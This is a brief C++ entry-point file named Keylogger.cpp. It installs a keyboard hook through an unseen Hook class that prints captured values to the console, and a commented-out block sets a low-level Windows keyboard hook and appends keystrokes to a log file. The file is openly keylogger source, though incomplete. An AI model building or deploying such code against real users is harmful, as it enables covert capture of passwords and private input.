// Keylogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include "Hook.h"

using namespace std;

std::wofstream logFile;

int main() {
	auto hook = new Hook();
	hook->SetHook([](int a) -> void { cout << a; });
	while (GetMessage(NULL, NULL, 0, 0));

	/*Hook = SetWindowsHookEx(WH_KEYBOARD_LL, kbProc, NULL, 0);
	logFile.open(L"capturing_your_keyboard.txt", std::ios::app);

	while (GetMessage(NULL, NULL, 0, 0));

	logFile.close();*/

	return 0;
}

